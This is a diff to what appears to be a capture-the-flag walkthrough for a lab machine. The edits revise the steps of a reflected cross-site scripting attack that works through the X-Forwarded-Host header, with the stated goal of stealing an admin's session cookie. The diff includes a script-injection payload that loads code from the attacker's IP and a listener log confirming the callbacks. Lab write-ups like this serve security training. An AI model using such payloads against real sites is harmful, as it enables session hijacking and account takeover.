@@ -407,7 +407,7 @@ This feature matches the `/firewalls` path discovered during fuzzing:
 
 The page informs us that the service is under admin maintenance.
 
-This information can be very important, because we already know that there are admins visiting this endpoint. So, if we discover any vulnerability like a `XSS` (Cross-Site Scripting), we can attempt to `capture` the admin's cookies.
+This information can be very important, because we already know that there are admins visiting this endpoint. So, if we discover any vulnerability like a `XSS` (Cross-Site Scripting), we can attempt to `steal` the admin's session cookie
 
 <br />
 
@@ -461,9 +461,9 @@ Analyzing the server response, we can see an interesting piece of code:
 
 <br />
 
-Apparently, the website is making a request to `/static/js/lib.js`, passing the `utm_source` parameter with the value `http://internal-proxy.local`
+The website makes a request to `/static/js/lib.js`, passing the `utm_source` parameter with the value `http://internal-proxy.local`
 
-Next step is to discover where the website is looking for the `utm_source` value. 
+The next step is to discover where the website is looking for the `utm_source` value. 
 
 There are several possibilities, but trying to control this value with a header like `X-Forwarded-Host` makes more sense to me.
 
@@ -475,11 +475,11 @@ So let's try to add the `X-Forwarded-Host: test` header to our request:
 
 <br />
 
-We did it! Our input was reflected in the output!
+The input was successfully reflected in the response!
 
-This opens the door to a lof of vulnerabilities, the most obvious being `XSS`, because we're injecting our input inside `HTML` tags.
+This opens the door to a lot of vulnerabilities, the most obvious being `XSS`, because we're injecting our input into `HTML` tags.
 
-If we escape these tags, we may be able to execute `JavaScript` code.
+If we manage to break out of these tags, we can execute `JavaScript` code.
 
 To test this, we will use the following payload:
 
@@ -489,6 +489,24 @@ To test this, we will use the following payload:
 "></script><script src="http://10.10.14.13/"><"
 ```
 
+![14](../../../assets/images/Caption/14.png)
 
+<br />
 
+We forward the request and check our listener:
 
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.14.13 - - [30/Jun/2025 19:01:10] "GET / HTTP/1.1" 200 -
+10.10.14.13 - - [30/Jun/2025 19:01:11] "GET / HTTP/1.1" 200 -
+10.10.14.13 - - [30/Jun/2025 19:01:11] "GET / HTTP/1.1" 200 -
+```
+
+<br />
+
+Perfect! We received our requests!
+
+<br />
